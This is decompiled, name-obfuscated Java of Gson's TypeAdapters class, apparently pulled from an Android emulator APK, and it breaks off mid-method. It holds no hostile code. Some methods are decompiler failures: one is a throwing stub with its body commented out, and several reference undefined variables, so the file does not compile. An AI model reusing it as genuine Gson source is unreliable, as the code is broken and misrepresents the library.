package com.google.gson.internal.bind;

import B4ZgIw.AYUAbz;
import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonIOException;
import com.google.gson.JsonNull;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import com.google.gson.JsonSyntaxException;
import com.google.gson.TypeAdapter;
import com.google.gson.TypeAdapterFactory;
import com.google.gson.reflect.TypeToken;
import java.lang.reflect.Method;
import java.math.BigDecimal;
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.sql.Timestamp;
import java.util.ArrayList;
import java.util.BitSet;
import java.util.Calendar;
import java.util.Currency;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Locale;
import java.util.Map;
import java.util.StringTokenizer;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicIntegerArray;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes2.dex */
public abstract class ARc23Z {

    /* renamed from: A2egSU, reason: collision with root package name */
    public static final TypeAdapterFactory f12099A2egSU = new TypeAdapters$32(Class.class, new TypeAdapter<Class>() { // from class: com.google.gson.internal.bind.TypeAdapters$1
        @Override // com.google.gson.TypeAdapter
        /* renamed from: read */
        public final Class read2(Q2dWmT.A4TApA a4TApA) {
            if (a4TApA.BChYOn() != 9) {
                throw new UnsupportedOperationException("Attempted to deserialize a java.lang.Class. Forgot to register a type adapter?");
            }
            a4TApA.B3GDIM();
            return null;
        }

        @Override // com.google.gson.TypeAdapter
        public final void write(Q2dWmT.A5SV6n a5SV6n, Class cls) {
            Class cls2 = cls;
            if (cls2 == null) {
                a5SV6n.AZOQYO();
                return;
            }
            throw new UnsupportedOperationException("Attempted to serialize java.lang.Class: " + cls2.getName() + ". Forgot to register a type adapter?");
        }
    });

    /* renamed from: A4TApA, reason: collision with root package name */
    public static final TypeAdapterFactory f12100A4TApA = new TypeAdapters$32(BitSet.class, new TypeAdapter<BitSet>() { // from class: com.google.gson.internal.bind.TypeAdapters$2
        /* JADX WARN: Code restructure failed: missing block: B:25:0x0045, code lost:
        
            if (r8.AmA8tU() != 0) goto L22;
         */
        /* JADX WARN: Code restructure failed: missing block: B:26:0x0048, code lost:
        
            r6 = false;
         */
        /* JADX WARN: Code restructure failed: missing block: B:27:0x0049, code lost:
        
            r1 = r6;
         */
        /* JADX WARN: Code restructure failed: missing block: B:31:0x0053, code lost:
        
            if (java.lang.Integer.parseInt(r1) != 0) goto L22;
         */
        @Override // com.google.gson.TypeAdapter
        /* renamed from: read */
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct add '--show-bad-code' argument
        */
        public final java.util.BitSet read2(Q2dWmT.A4TApA r8) {
            /*
                r7 = this;
                int r0 = r8.BChYOn()
                r1 = 9
                if (r0 != r1) goto Ld
                r8.B3GDIM()
                r8 = 0
                return r8
            Ld:
                java.util.BitSet r0 = new java.util.BitSet
                r0.<init>()
                r8.A2egSU()
                int r1 = r8.BChYOn()
                r2 = 0
                r3 = 0
            L1b:
                r4 = 2
                if (r1 == r4) goto L6e
                int r4 = B4ZgIw.AYUAbz.ADYaiT(r1)
                r5 = 5
                r6 = 1
                if (r4 == r5) goto L4b
                r5 = 6
                if (r4 == r5) goto L41
                r5 = 7
                if (r4 != r5) goto L31
                boolean r1 = r8.AcNBzu()
                goto L56
            L31:
                com.google.gson.JsonSyntaxException r8 = new com.google.gson.JsonSyntaxException
                java.lang.String r0 = J3FDQU.A2egSU.BPw6Q8(r1)
                java.lang.String r1 = "Invalid bitset value type: "
                java.lang.String r0 = r1.concat(r0)
                r8.<init>(r0)
                throw r8
            L41:
                int r1 = r8.AmA8tU()
                if (r1 == 0) goto L48
                goto L49
            L48:
                r6 = 0
            L49:
                r1 = r6
                goto L56
            L4b:
                java.lang.String r1 = r8.B7CMnp()
                int r1 = java.lang.Integer.parseInt(r1)     // Catch: java.lang.NumberFormatException -> L62
                if (r1 == 0) goto L48
                goto L49
            L56:
                if (r1 == 0) goto L5b
                r0.set(r3)
            L5b:
                int r3 = r3 + 1
                int r1 = r8.BChYOn()
                goto L1b
            L62:
                com.google.gson.JsonSyntaxException r8 = new com.google.gson.JsonSyntaxException
                java.lang.String r0 = "Error: Expecting: bitset number value (1, 0), Found: "
                java.lang.String r0 = ADYaiT.CtFAbx.BChYOn(r0, r1)
                r8.<init>(r0)
                throw r8
            L6e:
                r8.AMqCpz()
                return r0
            */
            throw new UnsupportedOperationException("Method not decompiled: com.google.gson.internal.bind.TypeAdapters$2.read2(Q2dWmT.A4TApA):java.lang.Object");
        }

        @Override // com.google.gson.TypeAdapter
        public final void write(Q2dWmT.A5SV6n a5SV6n, BitSet bitSet) {
            BitSet bitSet2 = bitSet;
            if (bitSet2 == null) {
                a5SV6n.AZOQYO();
                return;
            }
            a5SV6n.A4TApA();
            for (int i = 0; i < bitSet2.length(); i++) {
                a5SV6n.AlLFFp(bitSet2.get(i) ? 1L : 0L);
            }
            a5SV6n.AMqCpz();
        }
    });

    /* renamed from: A5SV6n, reason: collision with root package name */
    public static final TypeAdapter f12101A5SV6n;

    /* renamed from: ADYaiT, reason: collision with root package name */
    public static final TypeAdapterFactory f12102ADYaiT;
    public static final TypeAdapterFactory AMqCpz;

    /* renamed from: ARc23Z, reason: collision with root package name */
    public static final TypeAdapterFactory f12103ARc23Z;

    /* renamed from: ASJ6gh, reason: collision with root package name */
    public static final TypeAdapterFactory f12104ASJ6gh;

    /* renamed from: AYUAbz, reason: collision with root package name */
    public static final TypeAdapterFactory f12105AYUAbz;

    /* renamed from: AZOQYO, reason: collision with root package name */
    public static final TypeAdapterFactory f12106AZOQYO;

    /* renamed from: AZkASS, reason: collision with root package name */
    public static final TypeAdapterFactory f12107AZkASS;

    /* renamed from: AaHO0E, reason: collision with root package name */
    public static final TypeAdapter f12108AaHO0E;

    /* renamed from: AcNBzu, reason: collision with root package name */
    public static final TypeAdapter f12109AcNBzu;

    /* renamed from: AlLFFp, reason: collision with root package name */
    public static final TypeAdapter f12110AlLFFp;

    /* renamed from: AmA8tU, reason: collision with root package name */
    public static final TypeAdapterFactory f12111AmA8tU;

    /* renamed from: AzWtSf, reason: collision with root package name */
    public static final TypeAdapterFactory f12112AzWtSf;

    /* renamed from: B25kr6, reason: collision with root package name */
    public static final TypeAdapter f12113B25kr6;

    /* renamed from: B2KMhB, reason: collision with root package name */
    public static final TypeAdapter f12114B2KMhB;

    /* renamed from: B3GDIM, reason: collision with root package name */
    public static final TypeAdapterFactory f12115B3GDIM;

    /* renamed from: B4ZgIw, reason: collision with root package name */
    public static final TypeAdapterFactory f12116B4ZgIw;

    /* renamed from: B7CMnp, reason: collision with root package name */
    public static final TypeAdapterFactory f12117B7CMnp;

    /* renamed from: B9tovu, reason: collision with root package name */
    public static final TypeAdapterFactory f12118B9tovu;

    /* renamed from: BChYOn, reason: collision with root package name */
    public static final TypeAdapterFactory f12119BChYOn;

    /* renamed from: BI9f7h, reason: collision with root package name */
    public static final TypeAdapterFactory f12120BI9f7h;

    /* renamed from: BIYEnU, reason: collision with root package name */
    public static final TypeAdapterFactory f12121BIYEnU;

    /* renamed from: BJ7GGh, reason: collision with root package name */
    public static final TypeAdapterFactory f12122BJ7GGh;

    /* renamed from: BNL6CD, reason: collision with root package name */
    public static final TypeAdapterFactory f12123BNL6CD;

    /* renamed from: BPw6Q8, reason: collision with root package name */
    public static final TypeAdapterFactory f12124BPw6Q8;

    /* renamed from: BTvldC, reason: collision with root package name */
    public static final TypeAdapterFactory f12125BTvldC;

    /* renamed from: BV3sI0, reason: collision with root package name */
    public static final TypeAdapter f12126BV3sI0;

    /* renamed from: BmvVmW, reason: collision with root package name */
    public static final TypeAdapterFactory f12127BmvVmW;

    /* renamed from: BniPrB, reason: collision with root package name */
    public static final TypeAdapterFactory f12128BniPrB;

    static {
        TypeAdapter<Boolean> typeAdapter = new TypeAdapter<Boolean>() { // from class: com.google.gson.internal.bind.TypeAdapters$3
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final Boolean read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() != 9) {
                    return a4TApA.BChYOn() == 6 ? Boolean.valueOf(Boolean.parseBoolean(a4TApA.B7CMnp())) : Boolean.valueOf(a4TApA.AcNBzu());
                }
                a4TApA.B3GDIM();
                return null;
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, Boolean bool) {
                a5SV6n.AmA8tU(bool);
            }
        };
        f12101A5SV6n = new TypeAdapter<Boolean>() { // from class: com.google.gson.internal.bind.TypeAdapters$4
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final Boolean read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() != 9) {
                    return Boolean.valueOf(a4TApA.B7CMnp());
                }
                a4TApA.B3GDIM();
                return null;
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, Boolean bool) {
                Boolean bool2 = bool;
                a5SV6n.B25kr6(bool2 == null ? "null" : bool2.toString());
            }
        };
        f12102ADYaiT = new TypeAdapters$33(Boolean.TYPE, Boolean.class, typeAdapter);
        AMqCpz = new TypeAdapters$33(Byte.TYPE, Byte.class, new TypeAdapter<Number>() { // from class: com.google.gson.internal.bind.TypeAdapters$5
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final Number read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() == 9) {
                    a4TApA.B3GDIM();
                    return null;
                }
                try {
                    return Byte.valueOf((byte) a4TApA.AmA8tU());
                } catch (NumberFormatException e) {
                    throw new JsonSyntaxException(e);
                }
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, Number number) {
                a5SV6n.AzWtSf(number);
            }
        });
        f12103ARc23Z = new TypeAdapters$33(Short.TYPE, Short.class, new TypeAdapter<Number>() { // from class: com.google.gson.internal.bind.TypeAdapters$6
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final Number read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() == 9) {
                    a4TApA.B3GDIM();
                    return null;
                }
                try {
                    return Short.valueOf((short) a4TApA.AmA8tU());
                } catch (NumberFormatException e) {
                    throw new JsonSyntaxException(e);
                }
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, Number number) {
                a5SV6n.AzWtSf(number);
            }
        });
        f12104ASJ6gh = new TypeAdapters$33(Integer.TYPE, Integer.class, new TypeAdapter<Number>() { // from class: com.google.gson.internal.bind.TypeAdapters$7
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final Number read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() == 9) {
                    a4TApA.B3GDIM();
                    return null;
                }
                try {
                    return Integer.valueOf(a4TApA.AmA8tU());
                } catch (NumberFormatException e) {
                    throw new JsonSyntaxException(e);
                }
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, Number number) {
                a5SV6n.AzWtSf(number);
            }
        });
        f12105AYUAbz = new TypeAdapters$32(AtomicInteger.class, new TypeAdapter<AtomicInteger>() { // from class: com.google.gson.internal.bind.TypeAdapters$8
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final AtomicInteger read2(Q2dWmT.A4TApA a4TApA) {
                try {
                    return new AtomicInteger(a4TApA.AmA8tU());
                } catch (NumberFormatException e) {
                    throw new JsonSyntaxException(e);
                }
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, AtomicInteger atomicInteger) {
                a5SV6n.AlLFFp(atomicInteger.get());
            }
        }.nullSafe());
        f12106AZOQYO = new TypeAdapters$32(AtomicBoolean.class, new TypeAdapter<AtomicBoolean>() { // from class: com.google.gson.internal.bind.TypeAdapters$9
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final AtomicBoolean read2(Q2dWmT.A4TApA a4TApA) {
                return new AtomicBoolean(a4TApA.AcNBzu());
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, AtomicBoolean atomicBoolean) {
                a5SV6n.B2KMhB(atomicBoolean.get());
            }
        }.nullSafe());
        f12107AZkASS = new TypeAdapters$32(AtomicIntegerArray.class, new TypeAdapter<AtomicIntegerArray>() { // from class: com.google.gson.internal.bind.TypeAdapters$10
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final AtomicIntegerArray read2(Q2dWmT.A4TApA a4TApA) {
                ArrayList arrayList = new ArrayList();
                a4TApA.A2egSU();
                while (a4TApA.AZOQYO()) {
                    try {
                        arrayList.add(Integer.valueOf(a4TApA.AmA8tU()));
                    } catch (NumberFormatException e) {
                        throw new JsonSyntaxException(e);
                    }
                }
                a4TApA.AMqCpz();
                int size = arrayList.size();
                AtomicIntegerArray atomicIntegerArray = new AtomicIntegerArray(size);
                for (int i = 0; i < size; i++) {
                    atomicIntegerArray.set(i, ((Integer) arrayList.get(i)).intValue());
                }
                return atomicIntegerArray;
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, AtomicIntegerArray atomicIntegerArray) {
                a5SV6n.A4TApA();
                int length = atomicIntegerArray.length();
                for (int i = 0; i < length; i++) {
                    a5SV6n.AlLFFp(r6.get(i));
                }
                a5SV6n.AMqCpz();
            }
        }.nullSafe());
        f12108AaHO0E = new TypeAdapter<Number>() { // from class: com.google.gson.internal.bind.TypeAdapters$11
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final Number read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() == 9) {
                    a4TApA.B3GDIM();
                    return null;
                }
                try {
                    return Long.valueOf(a4TApA.AzWtSf());
                } catch (NumberFormatException e) {
                    throw new JsonSyntaxException(e);
                }
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, Number number) {
                a5SV6n.AzWtSf(number);
            }
        };
        f12109AcNBzu = new TypeAdapter<Number>() { // from class: com.google.gson.internal.bind.TypeAdapters$12
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final Number read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() != 9) {
                    return Float.valueOf((float) a4TApA.AlLFFp());
                }
                a4TApA.B3GDIM();
                return null;
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, Number number) {
                a5SV6n.AzWtSf(number);
            }
        };
        f12110AlLFFp = new TypeAdapter<Number>() { // from class: com.google.gson.internal.bind.TypeAdapters$13
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final Number read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() != 9) {
                    return Double.valueOf(a4TApA.AlLFFp());
                }
                a4TApA.B3GDIM();
                return null;
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, Number number) {
                a5SV6n.AzWtSf(number);
            }
        };
        f12111AmA8tU = new TypeAdapters$32(Number.class, new TypeAdapter<Number>() { // from class: com.google.gson.internal.bind.TypeAdapters$14
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final Number read2(Q2dWmT.A4TApA a4TApA) {
                int BChYOn2 = a4TApA.BChYOn();
                int ADYaiT2 = AYUAbz.ADYaiT(BChYOn2);
                if (ADYaiT2 == 6) {
                    return new com.google.gson.internal.AYUAbz(a4TApA.B7CMnp());
                }
                if (ADYaiT2 != 8) {
                    throw new JsonSyntaxException("Expecting number, got: ".concat(J3FDQU.A2egSU.BPw6Q8(BChYOn2)));
                }
                a4TApA.B3GDIM();
                return null;
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, Number number) {
                a5SV6n.AzWtSf(number);
            }
        });
        f12112AzWtSf = new TypeAdapters$33(Character.TYPE, Character.class, new TypeAdapter<Character>() { // from class: com.google.gson.internal.bind.TypeAdapters$15
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final Character read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() == 9) {
                    a4TApA.B3GDIM();
                    return null;
                }
                String B7CMnp2 = a4TApA.B7CMnp();
                if (B7CMnp2.length() == 1) {
                    return Character.valueOf(B7CMnp2.charAt(0));
                }
                throw new JsonSyntaxException("Expecting character, got: ".concat(B7CMnp2));
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, Character ch) {
                Character ch2 = ch;
                a5SV6n.B25kr6(ch2 == null ? null : String.valueOf(ch2));
            }
        });
        TypeAdapter<String> typeAdapter2 = new TypeAdapter<String>() { // from class: com.google.gson.internal.bind.TypeAdapters$16
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final String read2(Q2dWmT.A4TApA a4TApA) {
                int BChYOn2 = a4TApA.BChYOn();
                if (BChYOn2 != 9) {
                    return BChYOn2 == 8 ? Boolean.toString(a4TApA.AcNBzu()) : a4TApA.B7CMnp();
                }
                a4TApA.B3GDIM();
                return null;
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, String str) {
                a5SV6n.B25kr6(str);
            }
        };
        f12113B25kr6 = new TypeAdapter<BigDecimal>() { // from class: com.google.gson.internal.bind.TypeAdapters$17
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final BigDecimal read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() == 9) {
                    a4TApA.B3GDIM();
                    return null;
                }
                try {
                    return new BigDecimal(a4TApA.B7CMnp());
                } catch (NumberFormatException e) {
                    throw new JsonSyntaxException(e);
                }
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, BigDecimal bigDecimal) {
                a5SV6n.AzWtSf(bigDecimal);
            }
        };
        f12114B2KMhB = new TypeAdapter<BigInteger>() { // from class: com.google.gson.internal.bind.TypeAdapters$18
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final BigInteger read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() == 9) {
                    a4TApA.B3GDIM();
                    return null;
                }
                try {
                    return new BigInteger(a4TApA.B7CMnp());
                } catch (NumberFormatException e) {
                    throw new JsonSyntaxException(e);
                }
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, BigInteger bigInteger) {
                a5SV6n.AzWtSf(bigInteger);
            }
        };
        f12115B3GDIM = new TypeAdapters$32(String.class, typeAdapter2);
        f12116B4ZgIw = new TypeAdapters$32(StringBuilder.class, new TypeAdapter<StringBuilder>() { // from class: com.google.gson.internal.bind.TypeAdapters$19
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final StringBuilder read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() != 9) {
                    return new StringBuilder(a4TApA.B7CMnp());
                }
                a4TApA.B3GDIM();
                return null;
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, StringBuilder sb) {
                StringBuilder sb2 = sb;
                a5SV6n.B25kr6(sb2 == null ? null : sb2.toString());
            }
        });
        f12117B7CMnp = new TypeAdapters$32(StringBuffer.class, new TypeAdapter<StringBuffer>() { // from class: com.google.gson.internal.bind.TypeAdapters$20
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final StringBuffer read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() != 9) {
                    return new StringBuffer(a4TApA.B7CMnp());
                }
                a4TApA.B3GDIM();
                return null;
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, StringBuffer stringBuffer) {
                StringBuffer stringBuffer2 = stringBuffer;
                a5SV6n.B25kr6(stringBuffer2 == null ? null : stringBuffer2.toString());
            }
        });
        f12118B9tovu = new TypeAdapters$32(URL.class, new TypeAdapter<URL>() { // from class: com.google.gson.internal.bind.TypeAdapters$21
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final URL read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() == 9) {
                    a4TApA.B3GDIM();
                    return null;
                }
                String B7CMnp2 = a4TApA.B7CMnp();
                if ("null".equals(B7CMnp2)) {
                    return null;
                }
                return new URL(B7CMnp2);
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, URL url) {
                URL url2 = url;
                a5SV6n.B25kr6(url2 == null ? null : url2.toExternalForm());
            }
        });
        f12119BChYOn = new TypeAdapters$32(URI.class, new TypeAdapter<URI>() { // from class: com.google.gson.internal.bind.TypeAdapters$22
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final URI read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() == 9) {
                    a4TApA.B3GDIM();
                    return null;
                }
                try {
                    String B7CMnp2 = a4TApA.B7CMnp();
                    if ("null".equals(B7CMnp2)) {
                        return null;
                    }
                    return new URI(B7CMnp2);
                } catch (URISyntaxException e) {
                    throw new JsonIOException(e);
                }
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, URI uri) {
                URI uri2 = uri;
                a5SV6n.B25kr6(uri2 == null ? null : uri2.toASCIIString());
            }
        });
        f12120BI9f7h = new TypeAdapters$35(InetAddress.class, new TypeAdapter<InetAddress>() { // from class: com.google.gson.internal.bind.TypeAdapters$23
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final InetAddress read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() != 9) {
                    return InetAddress.getByName(a4TApA.B7CMnp());
                }
                a4TApA.B3GDIM();
                return null;
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, InetAddress inetAddress) {
                InetAddress inetAddress2 = inetAddress;
                a5SV6n.B25kr6(inetAddress2 == null ? null : inetAddress2.getHostAddress());
            }
        });
        f12121BIYEnU = new TypeAdapters$32(UUID.class, new TypeAdapter<UUID>() { // from class: com.google.gson.internal.bind.TypeAdapters$24
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final UUID read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() != 9) {
                    return UUID.fromString(a4TApA.B7CMnp());
                }
                a4TApA.B3GDIM();
                return null;
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, UUID uuid) {
                UUID uuid2 = uuid;
                a5SV6n.B25kr6(uuid2 == null ? null : uuid2.toString());
            }
        });
        f12122BJ7GGh = new TypeAdapters$32(Currency.class, new TypeAdapter<Currency>() { // from class: com.google.gson.internal.bind.TypeAdapters$25
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final Currency read2(Q2dWmT.A4TApA a4TApA) {
                return Currency.getInstance(a4TApA.B7CMnp());
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, Currency currency) {
                a5SV6n.B25kr6(currency.getCurrencyCode());
            }
        }.nullSafe());
        f12123BNL6CD = new TypeAdapterFactory() { // from class: com.google.gson.internal.bind.TypeAdapters$26
            @Override // com.google.gson.TypeAdapterFactory
            public final TypeAdapter create(Gson gson, TypeToken typeToken) {
                if (typeToken.getRawType() != Timestamp.class) {
                    return null;
                }
                final TypeAdapter adapter = gson.getAdapter(Date.class);
                return new TypeAdapter<Timestamp>() { // from class: com.google.gson.internal.bind.TypeAdapters$26.1
                    @Override // com.google.gson.TypeAdapter
                    /* renamed from: read */
                    public final Timestamp read2(Q2dWmT.A4TApA a4TApA) {
                        Date date = (Date) TypeAdapter.this.read2(a4TApA);
                        if (date != null) {
                            return new Timestamp(date.getTime());
                        }
                        return null;
                    }

                    @Override // com.google.gson.TypeAdapter
                    public final void write(Q2dWmT.A5SV6n a5SV6n, Timestamp timestamp) {
                        TypeAdapter.this.write(a5SV6n, timestamp);
                    }
                };
            }
        };
        final TypeAdapter<Calendar> typeAdapter3 = new TypeAdapter<Calendar>() { // from class: com.google.gson.internal.bind.TypeAdapters$27
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final Calendar read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() == 9) {
                    a4TApA.B3GDIM();
                    return null;
                }
                a4TApA.A4TApA();
                int i = 0;
                int i2 = 0;
                int i3 = 0;
                int i4 = 0;
                int i5 = 0;
                int i6 = 0;
                while (a4TApA.BChYOn() != 4) {
                    String B25kr62 = a4TApA.B25kr6();
                    int AmA8tU2 = a4TApA.AmA8tU();
                    if ("year".equals(B25kr62)) {
                        i = AmA8tU2;
                    } else if ("month".equals(B25kr62)) {
                        i2 = AmA8tU2;
                    } else if ("dayOfMonth".equals(B25kr62)) {
                        i3 = AmA8tU2;
                    } else if ("hourOfDay".equals(B25kr62)) {
                        i4 = AmA8tU2;
                    } else if ("minute".equals(B25kr62)) {
                        i5 = AmA8tU2;
                    } else if ("second".equals(B25kr62)) {
                        i6 = AmA8tU2;
                    }
                }
                a4TApA.ARc23Z();
                return new GregorianCalendar(i, i2, i3, i4, i5, i6);
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, Calendar calendar) {
                if (calendar == null) {
                    a5SV6n.AZOQYO();
                    return;
                }
                a5SV6n.A5SV6n();
                a5SV6n.ASJ6gh("year");
                a5SV6n.AlLFFp(r4.get(1));
                a5SV6n.ASJ6gh("month");
                a5SV6n.AlLFFp(r4.get(2));
                a5SV6n.ASJ6gh("dayOfMonth");
                a5SV6n.AlLFFp(r4.get(5));
                a5SV6n.ASJ6gh("hourOfDay");
                a5SV6n.AlLFFp(r4.get(11));
                a5SV6n.ASJ6gh("minute");
                a5SV6n.AlLFFp(r4.get(12));
                a5SV6n.ASJ6gh("second");
                a5SV6n.AlLFFp(r4.get(13));
                a5SV6n.ARc23Z();
            }
        };
        f12124BPw6Q8 = new TypeAdapterFactory() { // from class: com.google.gson.internal.bind.TypeAdapters$34
            @Override // com.google.gson.TypeAdapterFactory
            public final TypeAdapter create(Gson gson, TypeToken typeToken) {
                Class rawType = typeToken.getRawType();
                if (rawType == Calendar.class || rawType == GregorianCalendar.class) {
                    return TypeAdapter.this;
                }
                return null;
            }

            public final String toString() {
                return "Factory[type=" + Calendar.class.getName() + "+" + GregorianCalendar.class.getName() + ",adapter=" + TypeAdapter.this + "]";
            }
        };
        f12125BTvldC = new TypeAdapters$32(Locale.class, new TypeAdapter<Locale>() { // from class: com.google.gson.internal.bind.TypeAdapters$28
            @Override // com.google.gson.TypeAdapter
            /* renamed from: read */
            public final Locale read2(Q2dWmT.A4TApA a4TApA) {
                if (a4TApA.BChYOn() == 9) {
                    a4TApA.B3GDIM();
                    return null;
                }
                StringTokenizer stringTokenizer = new StringTokenizer(a4TApA.B7CMnp(), "_");
                String nextToken = stringTokenizer.hasMoreElements() ? stringTokenizer.nextToken() : null;
                String nextToken2 = stringTokenizer.hasMoreElements() ? stringTokenizer.nextToken() : null;
                String nextToken3 = stringTokenizer.hasMoreElements() ? stringTokenizer.nextToken() : null;
                return (nextToken2 == null && nextToken3 == null) ? new Locale(nextToken) : nextToken3 == null ? new Locale(nextToken, nextToken2) : new Locale(nextToken, nextToken2, nextToken3);
            }

            @Override // com.google.gson.TypeAdapter
            public final void write(Q2dWmT.A5SV6n a5SV6n, Locale locale) {
                Locale locale2 = locale;
                a5SV6n.B25kr6(locale2 == null ? null : locale2.toString());
            }
        });
        TypeAdapter<JsonElement> typeAdapter4 = new TypeAdapter<JsonElement>() { // from class: com.google.gson.internal.bind.TypeAdapters$29
            public static JsonElement A2egSU(Q2dWmT.A4TApA a4TApA) {
                int ADYaiT2 = AYUAbz.ADYaiT(a4TApA.BChYOn());
                if (ADYaiT2 == 0) {
                    JsonArray jsonArray = new JsonArray();
                    a4TApA.A2egSU();
                    while (a4TApA.AZOQYO()) {
                        jsonArray.add(A2egSU(a4TApA));
                    }
                    a4TApA.AMqCpz();
                    return jsonArray;
                }
                if (ADYaiT2 == 2) {
                    JsonObject jsonObject = new JsonObject();
                    a4TApA.A4TApA();
                    while (a4TApA.AZOQYO()) {
                        jsonObject.add(a4TApA.B25kr6(), A2egSU(a4TApA));
                    }
                    a4TApA.ARc23Z();
                    return jsonObject;
                }
                if (ADYaiT2 == 5) {
                    return new JsonPrimitive(a4TApA.B7CMnp());
                }
                if (ADYaiT2 == 6) {
                    return new JsonPrimitive((Number) new com.google.gson.internal.AYUAbz(a4TApA.B7CMnp()));
                }
                if (ADYaiT2 == 7) {
                    return new JsonPrimitive(Boolean.valueOf(a4TApA.AcNBzu()));
                }
                if (ADYaiT2 != 8) {
                    throw new IllegalArgumentException();
                }
                a4TApA.B3GDIM();
                return JsonNull.INSTANCE;
            }

            public static void A4TApA(JsonElement jsonElement, Q2dWmT.A5SV6n a5SV6n) {
                if (jsonElement == null || jsonElement.isJsonNull()) {
                    a5SV6n.AZOQYO();
                    return;
                }
                if (jsonElement.isJsonPrimitive()) {
                    JsonPrimitive asJsonPrimitive = jsonElement.getAsJsonPrimitive();
                    if (asJsonPrimitive.isNumber()) {
                        a5SV6n.AzWtSf(asJsonPrimitive.getAsNumber());
                        return;
